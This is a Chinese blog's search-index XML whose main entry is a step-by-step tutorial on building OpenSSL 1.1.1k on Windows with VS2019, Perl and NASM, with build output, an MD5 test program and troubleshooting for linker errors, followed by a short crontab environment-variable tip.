<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Windows编译OpenSSL</title>
    <url>/2021/04/26/%E5%BC%80%E5%8F%91/Windows%E7%BC%96%E8%AF%91OpenSSL/</url>
    <content><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>OpenSSL 源码（使用的 1.1.1k 版本）下载地址：<a href="https://github.com/openssl/openssl/archive/refs/tags/OpenSSL_1_1_1k.zip">链接</a><br>Perl for MS Windows 下载地址：<a href="https://strawberryperl.com/download/5.32.1.1/strawberry-perl-5.32.1.1-64bit.msi">链接</a><br>VS2019，自己找吧<br>nasm 下载地址：<a href="https://www.nasm.us/pub/nasm/releasebuilds/2.15.05/win64/nasm-2.15.05-installer-x64.exe">链接</a></p>
<h2 id="安装编译环境"><a href="#安装编译环境" class="headerlink" title="安装编译环境"></a>安装编译环境</h2><p>当前使用的Windows 10 x64版本，所以编译环境也都选择了x64的版本。32位的版本没做测试。</p>
<h3 id="安装VS2019"><a href="#安装VS2019" class="headerlink" title="安装VS2019"></a>安装VS2019</h3><p>步骤略。</p>
<h3 id="安装-Perl"><a href="#安装-Perl" class="headerlink" title="安装 Perl"></a>安装 Perl</h3><p>下载并运行安装包后，一路下一步，安装完成后，打开<code>cmd</code>，输入<code>perl -V</code>，确认是否安装成功。安装成功会输出下列信息：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [版本 <span class="number">10</span>.<span class="number">0</span>.<span class="number">19042</span>.<span class="number">928</span>]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Admin</span>&gt;<span class="title">perl</span> -<span class="title">V</span></span></span><br><span class="line"><span class="function"><span class="title">Summary</span> <span class="title">of</span> <span class="title">my</span> <span class="title">perl5</span> (<span class="title">revision</span> 5 <span class="title">version</span> 32 <span class="title">subversion</span> 1) <span class="title">configuration</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Platform</span>:</span></span><br><span class="line"><span class="function">    <span class="title">osname</span>=<span class="title">MSWin32</span></span></span><br><span class="line"><span class="function">    <span class="title">osvers</span>=10.0.19042.746</span></span><br><span class="line"><span class="function">    <span class="title">archname</span>=<span class="title">MSWin32</span>-<span class="title">x64</span>-<span class="title">multi</span>-<span class="title">thread</span></span></span><br><span class="line"><span class="function">// 省略</span></span><br><span class="line"><span class="function">  <span class="title">Built</span> <span class="title">under</span> <span class="title">MSWin32</span></span></span><br><span class="line"><span class="function">  <span class="title">Compiled</span> <span class="title">at</span> <span class="title">Jan</span> 24 2021 15:05:42</span></span><br><span class="line"><span class="function">  @<span class="title">INC</span>:</span></span><br><span class="line"><span class="function">    <span class="title">C</span>:/<span class="title">Strawberry</span>/<span class="title">perl</span>/<span class="title">site</span>/<span class="title">lib</span></span></span><br><span class="line"><span class="function">    <span class="title">C</span>:/<span class="title">Strawberry</span>/<span class="title">perl</span>/<span class="title">vendor</span>/<span class="title">lib</span></span></span><br><span class="line"><span class="function">    <span class="title">C</span>:/<span class="title">Strawberry</span>/<span class="title">perl</span>/<span class="title">lib</span></span></span><br></pre></td></tr></table></figure>
<p>如果没有成功，检查系统环境变量<code>path</code>是否存在下面的路径：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Strawberry</span>\<span class="title">c</span>\<span class="title">bin</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Strawberry</span>\<span class="title">perl</span>\<span class="title">site</span>\<span class="title">bin</span>;</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Strawberry</span>\<span class="title">perl</span>\<span class="title">bin</span>;</span></span><br></pre></td></tr></table></figure>
<p>根据真实环境补全 perl 的所在目录。</p>
<h3 id="安装-nasm"><a href="#安装-nasm" class="headerlink" title="安装 nasm"></a>安装 nasm</h3><p>下载并运行安装包后，一路下一步，安装完成后，打开<code>cmd</code>，输入<code>nasm -v</code>，确认是否安装成功。安装成功会输出下列信息：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Microsoft Windows [版本 <span class="number">10</span>.<span class="number">0</span>.<span class="number">19042</span>.<span class="number">928</span>]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Admin</span>&gt;<span class="title">nasm</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"><span class="title">NASM</span> <span class="title">version</span> 2.15.05 <span class="title">compiled</span> <span class="title">on</span> <span class="title">Aug</span> 28 2020</span></span><br></pre></td></tr></table></figure>
<p>如果没有成功，检查系统环境变量<code>path</code>是否存在下面的路径：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">NASM</span></span></span><br></pre></td></tr></table></figure>
<p>根据真实环境补全 nasm 的所在目录。</p>
<h2 id="编译步骤"><a href="#编译步骤" class="headerlink" title="编译步骤"></a>编译步骤</h2><p>这里以编译x64版本的OpenSSL为例。</p>
<h3 id="步骤1-启动编译环境"><a href="#步骤1-启动编译环境" class="headerlink" title="步骤1 启动编译环境"></a>步骤1 启动编译环境</h3><p>在开始菜单中找到<code>Visual Studio 2019</code>目录中的<code>x86_x64 Cross Tools Command Prompt for VS 2019</code>，<strong><em>以管理员身份运行</em></strong>；<br><code>cd</code>进入<code>OpenSSL</code>源码的根目录：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">**********************************************************************</span><br><span class="line">** Visual Studio <span class="number">2019</span> Developer Command Prompt v16.<span class="number">9</span>.<span class="number">4</span></span><br><span class="line">** Copyright (c) <span class="number">2021</span> Microsoft Corporation</span><br><span class="line">**********************************************************************</span><br><span class="line">[vcvarsall.bat] Environment initialized <span class="keyword">for</span>: &#x27;x86_x64&#x27;</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">System32</span>&gt;<span class="title">cd</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="步骤2-生成编译配置文件"><a href="#步骤2-生成编译配置文件" class="headerlink" title="步骤2 生成编译配置文件"></a>步骤2 生成编译配置文件</h3><p>运行命令<code>perl Configure VC-WIN64A</code>，生成编译配置文件，成功后输出信息如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;<span class="title">perl</span> <span class="title">Configure</span> <span class="title">VC</span>-<span class="title">WIN64A</span></span></span><br><span class="line"><span class="function"><span class="title">Configuring</span> <span class="title">OpenSSL</span> <span class="title">version</span> 1.1.1<span class="title">k</span> (0<span class="title">x101010bfL</span>) <span class="title">for</span> <span class="title">VC</span>-<span class="title">WIN64A</span></span></span><br><span class="line"><span class="function"><span class="title">Using</span> <span class="title">os</span>-<span class="title">specific</span> <span class="title">seed</span> <span class="title">configuration</span></span></span><br><span class="line"><span class="function"><span class="title">Creating</span> <span class="title">configdata.pm</span></span></span><br><span class="line"><span class="function"><span class="title">Creating</span> <span class="title">makefile</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">**********************************************************************</span></span><br><span class="line"><span class="function">***                                                                ***</span></span><br><span class="line"><span class="function">***   <span class="title">OpenSSL</span> <span class="title">has</span> <span class="title">been</span> <span class="title">successfully</span> <span class="title">configured</span>                     ***</span></span><br><span class="line"><span class="function">***                                                                ***</span></span><br><span class="line"><span class="function">***   <span class="title">If</span> <span class="title">you</span> <span class="title">encounter</span> <span class="title">a</span> <span class="title">problem</span> <span class="title">while</span> <span class="title">building</span>, <span class="title">please</span> <span class="title">open</span> <span class="title">an</span>    ***</span></span><br><span class="line"><span class="function">***   <span class="title">issue</span> <span class="title">on</span> <span class="title">GitHub</span> &lt;<span class="title">https</span>://<span class="title">github.com</span>/<span class="title">openssl</span>/<span class="title">openssl</span>/<span class="title">issues</span>&gt;  ***</span></span><br><span class="line"><span class="function">***   <span class="title">and</span> <span class="title">include</span> <span class="title">the</span> <span class="title">output</span> <span class="title">from</span> <span class="title">the</span> <span class="title">following</span> <span class="title">command</span>:           ***</span></span><br><span class="line"><span class="function">***                                                                ***</span></span><br><span class="line"><span class="function">***       <span class="title">perl</span> <span class="title">configdata.pm</span> --<span class="title">dump</span>                                ***</span></span><br><span class="line"><span class="function">***                                                                ***</span></span><br><span class="line"><span class="function">***   (<span class="title">If</span> <span class="title">you</span> <span class="title">are</span> <span class="title">new</span> <span class="title">to</span> <span class="title">OpenSSL</span>, <span class="title">you</span> <span class="title">might</span> <span class="title">want</span> <span class="title">to</span> <span class="title">consult</span> <span class="title">the</span>    ***</span></span><br><span class="line"><span class="function">***   &#x27;<span class="title">Troubleshooting</span>&#x27; <span class="title">section</span> <span class="title">in</span> <span class="title">the</span> <span class="title">INSTALL</span> <span class="title">file</span> <span class="title">first</span>)         ***</span></span><br><span class="line"><span class="function">***                                                                ***</span></span><br><span class="line"><span class="function">**********************************************************************</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="步骤3-开始编译"><a href="#步骤3-开始编译" class="headerlink" title="步骤3 开始编译"></a>步骤3 开始编译</h3><p>运行命令<code>nmake</code>，开始编译，编译时间大约10分钟，成功后输出信息如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">        cl  /Zi /Fdapp.pdb /Gs0 /GF /Gy /<span class="built_in">MD</span> /W3 /wd4090 /nologo /O2 /I &quot;include&quot; -D&quot;OPENSSL_SYS_WIN32&quot; -D&quot;WIN32_LEAN_AND_MEAN&quot; -D&quot;UNICODE&quot; -D&quot;_UNICODE&quot; -D&quot;_CRT_SECURE_NO_DEPRECATE&quot; -D&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot; -D&quot;OPENSSL_USE_APPLINK&quot; -D&quot;NDEBUG&quot;  /Zs /showIncludes &quot;test\x509_time_test.c&quot; <span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt; test\x509_time_test.d</span><br><span class="line">        <span class="keyword">IF</span> <span class="keyword">EXIST</span> test\x509_time_test.exe.manifest <span class="built_in">DEL</span> /F /Q test\x509_time_test.exe.manifest</span><br><span class="line">        link /nologo /debug /subsystem:console /opt:ref  /nologo /debug /out:test\x509_time_test.exe @C:\Users\Admin\AppData\Local\Temp\nmC906.tmp</span><br><span class="line">        <span class="keyword">IF</span> <span class="keyword">EXIST</span> test\x509_time_test.exe.manifest  mt -nologo -manifest test\x509_time_test.exe.manifest -outputresource:test\x509_time_test.exe</span><br><span class="line">        cl  /Zi /Fdapp.pdb /Gs0 /GF /Gy /<span class="built_in">MD</span> /W3 /wd4090 /nologo /O2 /I &quot;include&quot; -D&quot;OPENSSL_SYS_WIN32&quot; -D&quot;WIN32_LEAN_AND_MEAN&quot; -D&quot;UNICODE&quot; -D&quot;_UNICODE&quot; -D&quot;_CRT_SECURE_NO_DEPRECATE&quot; -D&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot; -D&quot;OPENSSL_USE_APPLINK&quot; -D&quot;NDEBUG&quot;  -c /Fotest\x509aux.obj &quot;test\x509aux.c&quot;</span><br><span class="line">x509aux.c</span><br><span class="line">        cl  /Zi /Fdapp.pdb /Gs0 /GF /Gy /<span class="built_in">MD</span> /W3 /wd4090 /nologo /O2 /I &quot;include&quot; -D&quot;OPENSSL_SYS_WIN32&quot; -D&quot;WIN32_LEAN_AND_MEAN&quot; -D&quot;UNICODE&quot; -D&quot;_UNICODE&quot; -D&quot;_CRT_SECURE_NO_DEPRECATE&quot; -D&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot; -D&quot;OPENSSL_USE_APPLINK&quot; -D&quot;NDEBUG&quot;  /Zs /showIncludes &quot;test\x509aux.c&quot; <span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt; test\x509aux.d</span><br><span class="line">        <span class="keyword">IF</span> <span class="keyword">EXIST</span> test\x509aux.exe.manifest <span class="built_in">DEL</span> /F /Q test\x509aux.exe.manifest</span><br><span class="line">        link /nologo /debug /subsystem:console /opt:ref  /nologo /debug /out:test\x509aux.exe @C:\Users\Admin\AppData\Local\Temp\nmCACC.tmp</span><br><span class="line">        <span class="keyword">IF</span> <span class="keyword">EXIST</span> test\x509aux.exe.manifest  mt -nologo -manifest test\x509aux.exe.manifest -outputresource:test\x509aux.exe</span><br><span class="line">        &quot;C:\Strawberry\perl\bin\perl.exe&quot; &quot;-I.&quot; -Mconfigdata &quot;util\dofile.pl&quot;  &quot;-omakefile&quot; &quot;apps\CA.pl.<span class="keyword">in</span>&quot; &gt; &quot;apps\CA.pl&quot;</span><br><span class="line">        &quot;C:\Strawberry\perl\bin\perl.exe&quot; &quot;-I.&quot; -Mconfigdata &quot;util\dofile.pl&quot;  &quot;-omakefile&quot; &quot;apps\tsget.<span class="keyword">in</span>&quot; &gt; &quot;apps\tsget.pl&quot;</span><br><span class="line">        &quot;C:\Strawberry\perl\bin\perl.exe&quot; &quot;-I.&quot; -Mconfigdata &quot;util\dofile.pl&quot;  &quot;-omakefile&quot; &quot;tools\c_rehash.<span class="keyword">in</span>&quot; &gt; &quot;tools\c_rehash.pl&quot;</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="步骤4-测试编译结果"><a href="#步骤4-测试编译结果" class="headerlink" title="步骤4 测试编译结果"></a>步骤4 测试编译结果</h3><p>运行命令<code>nmake test</code>，测试编译结果，耗时大约10分钟，成功后输出信息如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">test\recipes\<span class="number">99</span>-test_ecstress.t ................. ok</span><br><span class="line">test\recipes\<span class="number">99</span>-test_fuzz.t ..................... ok</span><br><span class="line">All tests successful.</span><br><span class="line">Files=<span class="number">158</span>, Tests=<span class="number">2545</span>, <span class="number">451</span> wallclock secs ( <span class="number">1</span>.<span class="number">86</span> usr +  <span class="number">0</span>.<span class="number">50</span> sys =  <span class="number">2</span>.<span class="number">36</span> CPU)</span><br><span class="line"><span class="function">Result: <span class="title">PASS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="步骤5-安装"><a href="#步骤5-安装" class="headerlink" title="步骤5 安装"></a>步骤5 安装</h3><p>运行命令<code>nmake install</code>，安装文件，<code>x64</code>版本默认安装到<code>C:\Program Files\OpenSSL</code>，<code>x86</code>版本默认安装到<code>C:\Program Files (x86)\OpenSSL</code>，耗时大约3分钟，成功后输出信息如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">bio.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">crypto.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">ct.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">des_modes.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">Ed25519.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">Ed448.html</span> -&gt; <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">Ed25519.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">evp.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">ossl_store</span>-<span class="title">file.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">ossl_store.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">passphrase</span>-<span class="title">encoding.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">proxy</span>-<span class="title">certificates.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">RAND.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">RAND_DRBG.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">RSA</span>-<span class="title">PSS.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">scrypt.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">SM2.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">ssl.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">X25519.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">X448.html</span> -&gt; <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">X25519.html</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">OpenSSL</span>\<span class="title">html</span>\<span class="title">man7</span>\<span class="title">x509.html</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Admin</span>\<span class="title">source</span>\<span class="title">openssl</span>-<span class="title">OpenSSL_1_1_1k</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="编译多个版本"><a href="#编译多个版本" class="headerlink" title="编译多个版本"></a>编译多个版本</h3><p>如果还需要编译其它版本，例如要编译<code>x86</code>版本，需要<strong><em>以管理员身份运行</em></strong> x86 版本的VS2019的命令行工具<code>x86 Native Tools Command Prompt for VS 2019</code>，进入源码目录后，先执行清理命令，然后修改配置信息：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmake clean</span><br><span class="line">perl Configure VC-WIN32</span><br></pre></td></tr></table></figure>
<p>接下来从<code>步骤3 开始编译</code>再来一遍。</p>
<h2 id="使用-OpenSSL"><a href="#使用-OpenSSL" class="headerlink" title="使用 OpenSSL"></a>使用 OpenSSL</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>以计算MD5为例。<br>将安装后的<code>C:\Program Files\OpenSSL\include</code>和<code>C:\Program Files\OpenSSL\lib</code>添加到工程中：<br><img src="/2021/04/26/%E5%BC%80%E5%8F%91/Windows%E7%BC%96%E8%AF%91OpenSSL/233e11b4fe98.png" alt="233e11b4fe98.png"></p>
<p>代码中要根据实际情况使用头文件<code>.h</code>、静态库<code>.lib</code>、动态库<code>.dll</code>，这里只用到了<code>#include &lt;openssl\md5.h&gt;</code>、<code>#pragma comment(lib, &quot;libcrypto.lib&quot;)</code>、<code>libcrypto-1_1-x64.dll</code>。<br>测试代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl\md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> szBuf[<span class="number">6</span>] = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> md[MD5_DIGEST_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    MD5(szBuf, <span class="keyword">sizeof</span>(szBuf), md);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MD5_DIGEST_LENGTH; i++) </span><br><span class="line">    &#123;</span><br><span class="line">        printf_s(<span class="string">&quot;%02x&quot;</span>, md[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf_s(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果<code>e10adc3949ba59abbe56e057f20f883e</code>。</p>
<h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h3><ul>
<li>找不到dll</li>
</ul>
<p><img src="/2021/04/26/%E5%BC%80%E5%8F%91/Windows%E7%BC%96%E8%AF%91OpenSSL/44a882998935.png" alt="44a882998935.png"></p>
<p>检查对应版本的dll是否放到程序目录或者系统目录。</p>
<ul>
<li>编译报错<code>找不到标识符</code>或者<code>未声明的标识符</code></li>
</ul>
<p>报错详情：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">已启动生成…</span><br><span class="line"><span class="number">1</span>&gt;------ 已启动生成: 项目: test_openssl, 配置: Debug x64 ------</span><br><span class="line"><span class="number">1</span>&gt;test_openssl.cpp</span><br><span class="line"><span class="number">1</span>&gt;C:\Users\Admin\source\test_openssl\test_openssl.cpp(<span class="number">6</span>,<span class="number">22</span>): error C2065: “MD5_DIGEST_LENGTH”: 未声明的标识符</span><br><span class="line"><span class="number">1</span>&gt;C:\Users\Admin\source\test_openssl\test_openssl.cpp(<span class="number">7</span>,<span class="number">5</span>): error C3861: “MD5”: 找不到标识符</span><br><span class="line"><span class="number">1</span>&gt;C:\Users\Admin\source\test_openssl\test_openssl.cpp(<span class="number">9</span>,<span class="number">25</span>): error C2065: “MD5_DIGEST_LENGTH”: 未声明的标识符</span><br><span class="line"><span class="number">1</span>&gt;已完成生成项目“test_openssl.vcxproj”的操作 - 失败。</span><br><span class="line">========== 生成: 成功 <span class="number">0</span> 个，失败 <span class="number">1</span> 个，最新 <span class="number">0</span> 个，跳过 <span class="number">0</span> 个 ==========</span><br></pre></td></tr></table></figure>
<p>检查代码是否引入头文件<code>#include &lt;openssl\md5.h&gt;</code>。</p>
<ul>
<li>无法解析的外部符号<code>xxx</code></li>
</ul>
<p>报错详情：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">已启动生成…</span><br><span class="line"><span class="number">1</span>&gt;------ 已启动生成: 项目: test_openssl, 配置: Debug x64 ------</span><br><span class="line"><span class="number">1</span>&gt;test_openssl.cpp</span><br><span class="line"><span class="number">1</span>&gt;test_openssl.obj : error LNK2019: 无法解析的外部符号 MD5，函数 main 中引用了该符号</span><br><span class="line"><span class="number">1</span>&gt;C:\Users\Admin\source\test_openssl\x64\Debug\test_openssl.exe : fatal error LNK1120: <span class="number">1</span> 个无法解析的外部命令</span><br><span class="line"><span class="number">1</span>&gt;已完成生成项目“test_openssl.vcxproj”的操作 - 失败。</span><br><span class="line">========== 生成: 成功 <span class="number">0</span> 个，失败 <span class="number">1</span> 个，最新 <span class="number">0</span> 个，跳过 <span class="number">0</span> 个 ==========</span><br></pre></td></tr></table></figure>
<p>检查代码是否有<code>#pragma comment(lib, &quot;libcrypto.lib&quot;)</code>。</p>
<ul>
<li><p>无法打开包括文件<code>xxx.h</code><br>检查工程属性页的<code>配置属性 -- VC++ 目录 -- 包含目录</code>是否添加<code>C:\Program Files\OpenSSL\include</code>。</p>
</li>
<li><p>无法打开文件<code>xxx.lib</code><br>检查工程属性页的<code>配置属性 -- VC++ 目录 -- 库目录</code>是否添加<code>C:\Program Files\OpenSSL\lib</code>。</p>
</li>
<li><p>无法解析的外部符号<code>_函数名@数字</code></p>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">已启动生成…</span><br><span class="line"><span class="number">1</span>&gt;------ 已启动生成: 项目: test_openssl, 配置: Debug Win32 ------</span><br><span class="line"><span class="number">1</span>&gt;test_openssl.cpp</span><br><span class="line"><span class="number">1</span>&gt;test_openssl.obj : error LNK2019: 无法解析的外部符号 _MD5@<span class="number">12</span>，函数 _main 中引用了该符号</span><br><span class="line"><span class="number">1</span>&gt;C:\Users\Admin\source\test_openssl\Debug\test_openssl.exe : fatal error LNK1120: <span class="number">1</span> 个无法解析的外部命令</span><br><span class="line"><span class="number">1</span>&gt;已完成生成项目“test_openssl.vcxproj”的操作 - 失败。</span><br><span class="line">========== 生成: 成功 <span class="number">0</span> 个，失败 <span class="number">1</span> 个，最新 <span class="number">0</span> 个，跳过 <span class="number">0</span> 个 ==========</span><br></pre></td></tr></table></figure>
<p>这个问题只出现在32位环境，和上面的<code>无法解析的外部符号xxx</code>报错信息很像，但是函数名前后多了<code>_</code>和<code>@数字</code>字样，原因是代码工程使用了标准调用约定，<br>使用<code>__stdcall</code>，函数在obj 中显示为<code>_funname@参数总字节数</code>，用于函数本身平衡栈空间。<br>检查工程属性页的<code>配置属性 -- C/C++  --  高级  --  调用约定</code>，是否为C调用约定<code>_cdecl</code>，OpenSSL 默认使用C调用约定：<br><img src="/2021/04/26/%E5%BC%80%E5%8F%91/Windows%E7%BC%96%E8%AF%91OpenSSL/895ab22345bb.png" alt="895ab22345bb.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
<li>OpenSSL的 <a href="https://github.com/openssl/openssl/blob/master/NOTES-WINDOWS.md">README.md</a></li>
<li>OpenSSL源码目录中的<code>INSTALL</code>文件</li>
</ol>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>crontab中引入环境变量</title>
    <url>/2021/01/03/%E5%BC%80%E5%8F%91/crontab%E4%B8%AD%E5%BC%95%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>crontab 中默认使用的环境变量有限，导致定时任务中执行的脚本，会找不到命令。在执行的脚本中导入当前用户的环境变量可以解决问题。</p>
<h2 id="添加方式"><a href="#添加方式" class="headerlink" title="添加方式"></a>添加方式</h2><p>脚本中添加环境变量的方式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. /etc/profile</span><br><span class="line">~/.bash_profile</span><br></pre></td></tr></table></figure>
